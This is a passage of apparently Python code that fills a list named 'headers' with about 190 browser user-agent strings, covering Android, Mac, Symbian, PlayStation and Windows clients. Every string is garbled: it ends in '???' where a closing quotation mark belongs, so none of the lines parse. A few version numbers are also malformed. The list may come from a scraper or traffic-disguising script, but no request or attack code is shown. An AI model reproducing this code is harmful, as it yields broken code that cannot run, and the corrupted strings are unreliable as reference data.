    headers.append("Mozilla/5.0 (Linux U; en-US) AppleWebKit/528.5 (KHTML, like Gecko, Safari/528.5 ) Version/4.0 Kindle/3.0 (screen 600x800; rotate)???)
    headers.append("Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36???)
    headers.append("Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36???)
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36???)
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36???)
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G570Y Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36???)
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36???)
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36???)
    headers.append("Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.3???)
    headers.append("Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36???)
    headers.append("Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36???)
    headers.append("Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36???)
    headers.append("Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36???)
    headers.append("Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36???)
    headers.append("Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522 (KHTML, like Gecko) Safari/419.3???)
    headers.append("Mozilla/5.0 (Linux; U; Android 1.0; en-us; dream) AppleWebKit/525.10 (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2???)
    headers.append("Mozilla/5.0 (Linux; U; Android 1.1; en-gb; dream) AppleWebKit/525.10 (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2???)
    headers.append("Mozilla/5.0 (Linux; U; Android 1.5; de-ch; HTC Hero Build/CUPCAKE) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 1.5; de-de; Galaxy Build/CUPCAKE) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 1.5; de-de; HTC Magic Build/PLAT-RC33) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 FirePHP/0.3???)
    headers.append("Mozilla/5.0 (Linux; U; Android 1.5; en-gb; T-Mobile_G2_Touch Build/CUPCAKE) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 1.5; en-us; htc_bahamas Build/CRB17) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 1.5; en-us; sdk Build/CUPCAKE) AppleWebkit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 1.5; en-us; SPH-M900 Build/CUPCAKE) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 1.5; en-us; T-Mobile G1 Build/CRB43) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari 525.20.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 1.5; fr-fr; GT-I5700 Build/CUPCAKE) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 1.6; en-us; HTC_TATTOO_A3288 Build/DRC79) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 1.6; en-us; SonyEricssonX10i Build/R1AA056) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 1.6; es-es; SonyEricssonX10i Build/R1FA016) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 2.0.1; de-de; Milestone Build/SHOLS_U2_01.14.0) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17???)
    headers.append("Mozilla/5.0 (Linux; U; Android 2.0; en-us; Droid Build/ESD20) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17???)
    headers.append("Mozilla/5.0 (Linux; U; Android 2.0; en-us; Milestone Build/ SHOLS_U2_01.03.1) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17???)
    headers.append("Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; HTC Desire 1.19.161.5 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17???)
    headers.append("Mozilla/5.0 (Linux; U; Android 2.1; en-us; HTC Legend Build/cupcake) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17???)
    headers.append("Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17???)
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-ca; GT-P1000M Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-us; ADR6300 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 2.2; en-us; Sprint APA9292KT Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; BNTV250 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1???)
    headers.append("Mozilla/5.0 (Linux; U; Android 3.0.1; en-us; GT-P7100 Build/HRI83) AppleWebkit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13???)
    headers.append("Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13???)
    headers.append("Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/525.10 (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2???)
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30???)
    headers.append("Mozilla/5.0 (Linux; U; Android 4.0.3; de-de; Galaxy S II Build/GRJ22) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30???)
    headers.append("Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30???)
    headers.append("Mozilla/5.0 (Linux; U; Android 4.3; en-us; SM-N900T Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30???)
    headers.append("Mozilla/5.0 (Linux; U; en-US) AppleWebKit/528.5+ (KHTML, like Gecko, Safari/528.5+) Version/4.0 Kindle/3.0 (screen 600x800; rotate)???)
    headers.append("Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.5; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Camino/2.2.1???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre Camino/2.2a1pre???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20100101 Firefox/5.0???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:69.0) Gecko/20100101 Firefox/69.0???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:69.0) Gecko/20100101 Firefox/69.0???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Safari/605.1.15???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.2 Safari/605.1.15???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Safari/605.1.15???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.2 Safari/605.1.15???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Safari/605.1.15???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.2 Safari/605.1.15???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.???)
    headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15???)
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5???)
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.14) Gecko/20110218 AlexaToolbar/alxf-2.0 Firefox/3.6.14???)
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0???)
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17???)
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8???)
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10???)
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.464.0 Safari/534.3???)
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; de-de) AppleWebKit/534.15 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4???)
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13???)
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-us) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27???)
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/534.20.8 (KHTML, like Gecko) Version/5.1 Safari/534.20.8???)
    headers.append("Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0.112941???)
    headers.append("Mozilla/5.0 (Macintosh; U; Mac OS X Mach-O; en-US; rv:2.0a) Gecko/20040614 Firefox/3.0.0???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.0.3) Gecko/2008092414 Firefox/3.0.3???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; de; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.8)???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.1)???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/125.2 (KHTML, like Gecko)???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/85.8???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.8???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.6???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us)???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.15???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr)???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.5 (KHTML, like Gecko) Safari/312.3???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC Mac OS X; tg)???)
    headers.append("Mozilla/5.0 (Macintosh; U; PPC; de-DE; rv:1.0.2)???)
    headers.append("Mozilla/5.0 (Maemo; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1???)
    headers.append("Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1???)
    headers.append("Mozilla/5.0 (MeeGo; NokiaN9) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13???)
    headers.append("Mozilla/5.0 (MeeGo; NokiaN950-00/00) AppleWebKit/534.13 (KHTML, like Gecko) NokiaBrowser/8.5.0 Mobile Safari/534.13???)
    headers.append("Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU???)
    headers.append("Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US???)
    headers.append("Mozilla/5.0 (PLAYSTATION 3; 1.00)???)
    headers.append("Mozilla/5.0 (PLAYSTATION 3; 1.10)???)
    headers.append("Mozilla/5.0 (PLAYSTATION 3; 2.00)???)
    headers.append("Mozilla/5.0 (PLAYSTATION 3; 3.55)???)
    headers.append("Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73 (KHTML, like Gecko)???)
    headers.append("Mozilla/5.0 (PlayStation Vita 3.61) AppleWebKit/537.73 (KHTML, like Gecko) Silk/3.2???)
    headers.append("Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC6-01/011.010; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.2 3gpp-gba???)
    headers.append("Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC7-00/012.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba???)
    headers.append("Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE6-00/021.002; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.16 Mobile Safari/533.4 3gpp-gba???)
    headers.append("Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE7-00/010.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba???)
    headers.append("Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/014.002; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.4 3gpp-gba???)
    headers.append("Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaX7-00/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.21 Mobile Safari/533.4 3gpp-gba???)
    headers.append("Mozilla/5.0 (SymbianOS 9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344???)
    headers.append("Mozilla/5.0 (SymbianOS/9.1; U; de) AppleWebKit/413 (KHTML, like Gecko) Safari/413???)
    headers.append("Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413???)
    headers.append("Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es50???)
    headers.append("Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es65???)
    headers.append("Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es70???)
    headers.append("Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia5700/3.27; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413???)
    headers.append("Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia6120c/3.70; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413???)
    headers.append("Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/07.24.0.3; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.2.3.18.0???)
    headers.append("Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/10.0.018; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.3.0.0.0???)
    headers.append("Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413???)
    headers.append("Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344???)
    headers.append("Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 SonyEricssonP100/01; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525???)
    headers.append("Mozilla/5.0 (Unknown; U; UNIX BSD/SYSV system; C -) AppleWebKit/527 (KHTML, like Gecko, Safari/419.3) Arora/0.10.2???)
    headers.append("Mozilla/5.0 (webOS/1.3; U; en-US) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/1.0 Safari/525.27.1 Desktop/1.0???)
    headers.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0???)
    headers.append("Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1???)
    headers.append("Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0???)
    headers.append("Mozilla/5.0 (Windows NT 5.1; rv:52.0) Gecko/20100101 Firefox/52.0???)
    headers.append("Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991???)
    headers.append("Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1???)
    headers.append("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1???)
    headers.append("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2???)
    headers.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0???)
    headers.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0???)
    headers.append("Mozilla/5.0 (Windows NT 6.1; rv:69.0) Gecko/20100101 Firefox/69.0???)
